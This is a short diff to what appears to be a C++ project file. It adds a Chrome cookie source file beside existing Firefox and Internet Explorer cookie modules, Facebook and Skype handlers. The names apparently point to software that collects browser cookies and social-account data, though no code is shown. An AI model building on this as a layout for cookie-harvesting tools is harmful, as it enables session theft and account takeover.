@@ -131,6 +131,7 @@
     <ClCompile Include="SkypeACL\SkypeACL.cpp" />
     <ClCompile Include="SM_Core.cpp" />
     <ClCompile Include="Social\CookieHandler.cpp" />
+    <ClCompile Include="Social\Cookie_Chrome.cpp" />
     <ClCompile Include="Social\Cookie_FireFox.cpp" />
     <ClCompile Include="Social\Cookie_IExplorer.cpp" />
     <ClCompile Include="Social\Handler_Facebook.cpp" />
